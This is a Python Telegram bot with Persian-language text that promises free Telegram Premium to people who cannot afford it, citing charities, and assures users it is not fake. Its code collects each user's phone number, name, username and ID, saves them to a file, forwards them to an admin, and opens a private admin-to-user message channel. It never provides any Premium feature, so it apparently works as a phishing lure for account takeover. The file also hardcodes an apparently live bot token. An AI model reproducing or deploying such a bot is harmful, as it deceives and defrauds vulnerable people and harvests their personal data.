import telebot
from telebot import types
import json
import os
import time
from datetime import datetime

BOT_TOKEN = "8959366436:AAGdLpXmw6fLRaHLZIgv6K7EEm6bE9FFLjA"
ADMIN_ID = 8846247619
 
bot = telebot.TeleBot(BOT_TOKEN)

user_waiting_reply = {}
admin_target_user = None

DATA_FILE = "requests.json"

def save_request(user_data):
    requests_list = []
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                requests_list = json.load(f)
        except:
            requests_list = []
    requests_list.append(user_data)
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(requests_list, f, ensure_ascii=False, indent=2)

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user

    if user.id == ADMIN_ID:
        bot.send_message(
            message.chat.id,
            "👑 **سلام ادمین عزیز!**\n\n"
            "🔹 /stats - آمار درخواست‌ها\n\n"
            "منتظر درخواست‌های جدید هستیم...",
            parse_mode="Markdown"
        )
        return

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True
    )
    contact_btn = types.KeyboardButton(
        text="📱 ارسال شماره تلفن",
        request_contact=True
    )
    markup.add(contact_btn)

    welcome_text = (
            "🌟 **به ربات تلگرام پریمیوم خوش آمدید!** 🌟\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "✨ برای درخواست **تلگرام پریمیوم** لطفاً "
            "شماره تلفن خود را ارسال کنید.\n\n"
            "📱 روی دکمه **«ارسال شماره تلفن»** کلیک کنید.\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🔒 شماره شما فقط برای ثبت درخواست پریمیوم استفاده می‌شود."
        )

    welcome_text = (
        "🌟 **ما این بات رو به منظور کمک به افرادی ساخته ایم که توانایی پرداخت برای تلگرام پریمیوم را ندارند** 🌟\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "✨ نگران جعلی بودن بات نباشید زیرا ما از شما چیز مشکوکی نمیحواهیم"
        "روش فعال کردن پیمیوم برای شما اینطور است که با توسط شرکت هایی فعال میکنیم که به  خیریه های معتبر وصل استند و به روش های گوناگونی پول را به افراد  میدهند.\n\n"
        "📱 یکی از این روش ها فعال کردن تلگرام پریمیوم است برای افراد نیازمند است.\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🔒 پس نگران هیچی نباشید فقط مراحلی که در ادامه به شما میگوییم را دنبال کنید تا به پریمیوم خود برسید."
        "مدت زمان تلکرام پریمیوم شما ۶ ماه می باشد بعد از آن دیگر نمیتوانید پیریموم را از طریق بات فعال کنید زیرا برای افراد دیگر هم بتوانند پریمیوم داشته باشند."
    )

    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user = message.from_user
    contact = message.contact

    if contact.user_id != user.id:
        bot.send_message(
            message.chat.id,
            "❌ لطفاً **شماره تلفن خودتان** را ارسال کنید!",
            parse_mode="Markdown"
        )
        return

    phone_number = contact.phone_number
    if not phone_number.startswith("+"):
        phone_number = "+" + phone_number

    first_name = user.first_name or ""
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "ندارد"
    user_id = user.id

    request_data = {
        "user_id": user_id,
        "username": username,
        "full_name": full_name,
        "phone": phone_number,
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_request(request_data)

    admin_text = (
        "🔔 **درخواست جدید تلگرام پریمیوم!**\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 **نام:** {full_name}\n"
        f"🆔 **آیدی عددی:** `{user_id}`\n"
        f"📎 **یوزرنیم:** {username}\n"
        f"📱 **شماره تلفن:** `{phone_number}`\n"
        f"📅 **تاریخ:** {request_data['date']}\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    admin_markup.add(
        types.InlineKeyboardButton(text="✅ تایید", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton(text="❌ رد", callback_data=f"reject_{user_id}")
    )
    admin_markup.add(
        types.InlineKeyboardButton(text="💬 ارسال پیام به کاربر", callback_data=f"replyuser_{user_id}")
    )

    try:
        bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown", reply_markup=admin_markup)
    except Exception as e:
        print(f"Error: {e}")

    remove_markup = types.ReplyKeyboardRemove()
    user_text = (
        "✅ **درخواست شما با موفقیت ثبت شد!**\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"📱 شماره: `{phone_number}`\n\n"
        "⏳ درخواست شما به ادمین ارسال شد.\n"
        "لطفاً منتظر بمانید تا بررسی شود."
    )
    bot.send_message(message.chat.id, user_text, parse_mode="Markdown", reply_markup=remove_markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    global admin_target_user
    data = call.data

    if data.startswith("approve_"):
        if call.from_user.id != ADMIN_ID:
            return
        user_id = int(data.split("_")[1])
        try:
            bot.send_message(
                user_id,
                "🎉 **تبریک!**\n\n✅ درخواست تلگرام پریمیوم شما **تایید** شد!\nبه زودی فعال‌سازی انجام می‌شود.",
                parse_mode="Markdown"
            )
        except:
            pass
        bot.edit_message_text(call.message.text + "\n\n✅ **تایید شد**", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "✅ تایید شد!")

    elif data.startswith("reject_"):
        if call.from_user.id != ADMIN_ID:
            return
        user_id = int(data.split("_")[1])
        try:
            bot.send_message(
                user_id,
                "😔 **متأسفیم**\n\n❌ درخواست تلگرام پریمیوم شما **رد** شد.",
                parse_mode="Markdown"
            )
        except:
            pass
        bot.edit_message_text(call.message.text + "\n\n❌ **رد شد**", call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "❌ رد شد!")

    elif data.startswith("replyuser_"):
        if call.from_user.id != ADMIN_ID:
            return
        user_id = int(data.split("_")[1])
        admin_target_user = user_id
        bot.send_message(
            ADMIN_ID,
            f"✏️ **لطفاً پیام خود را برای کاربر `{user_id}` بفرستید:**\n\n"
            "پیام بعدی شما (متن، عکس، فایل، ویس و...) برای این کاربر ارسال خواهد شد.",
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "ارسال پیام آماده است.")

    elif data == "reply_admin":
        user_id = call.from_user.id
        user_waiting_reply[user_id] = True
        bot.send_message(
            user_id,
            "✏️ **لطفاً پاسخ خود را بنویسید یا فایل خود را ارسال کنید:**\n\n"
            "تنها پیام بعدی شما برای ادمین ارسال خواهد شد.",
            parse_mode="Markdown"
        )
        bot.answer_callback_query(call.id, "پاسخ دهید...")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id != ADMIN_ID:
        return
    count = 0
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                count = len(data)
        except:
            pass
    bot.send_message(ADMIN_ID, f"📊 **تعداد کل درخواست‌ها:** `{count}`", parse_mode="Markdown")

ALL_CONTENT_TYPES = ['text', 'photo', 'document', 'voice', 'video', 'sticker', 'audio', 'animation']

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and admin_target_user is not None, content_types=ALL_CONTENT_TYPES)
def admin_send_one_message(message):
    global admin_target_user
    target_id = admin_target_user
    admin_target_user = None

    user_markup = types.InlineKeyboardMarkup()
    user_markup.add(types.InlineKeyboardButton(text="✏️ پاسخ به ادمین", callback_data="reply_admin"))

    try:
        bot.send_message(target_id, "💬 **پیام جدید از طرف پشتیبانی:**", parse_mode="Markdown")
        bot.copy_message(
            chat_id=target_id,
            from_chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=user_markup
        )
        bot.send_message(ADMIN_ID, "✅ پیام شما با موفقیت به کاربر ارسال شد.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ خطا در ارسال پیام به کاربر: {e}")

@bot.message_handler(func=lambda m: m.from_user.id != ADMIN_ID and user_waiting_reply.get(m.from_user.id) is True, content_types=ALL_CONTENT_TYPES)
def user_send_one_message(message):
    user_id = message.from_user.id
    user_waiting_reply[user_id] = False

    admin_markup = types.InlineKeyboardMarkup()
    admin_markup.add(types.InlineKeyboardButton(text="💬 پاسخ به این کاربر", callback_data=f"replyuser_{user_id}"))

    try:
        bot.send_message(
            ADMIN_ID,
            f"📩 **پاسخ جدید از کاربر (`{user_id}`):**",
            parse_mode="Markdown"
        )
        bot.copy_message(
            chat_id=ADMIN_ID,
            from_chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=admin_markup
        )
        bot.send_message(message.chat.id, "✅ پاسخ شما با موفقیت برای ادمین ارسال شد.")
    except Exception as e:
        bot.send_message(message.chat.id, "❌ خطا در ارسال پیام.")

@bot.message_handler(func=lambda m: True, content_types=ALL_CONTENT_TYPES)
def handle_other_messages(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "⚠️ برای ارسال پیام به هر کاربر، ابتدا روی دکمه «ارسال پیام به کاربر» در درخواست مربوطه یا پاسخ‌های قبلی کلیک کنید.")
    else:
        bot.send_message(
            message.chat.id,
            "⚠️ برای درخواست تلگرام پریمیوم /start را بزنید.\n\n"
            "اگر می‌خواهید به پیام ادمین پاسخ دهید، روی دکمه «✏️ پاسخ به ادمین» زیر پیام ادمین کلیک کنید."
        )

if __name__ == "__main__":
    bot.remove_webhook()
    time.sleep(1)
    bot.infinity_polling(skip_pending=True)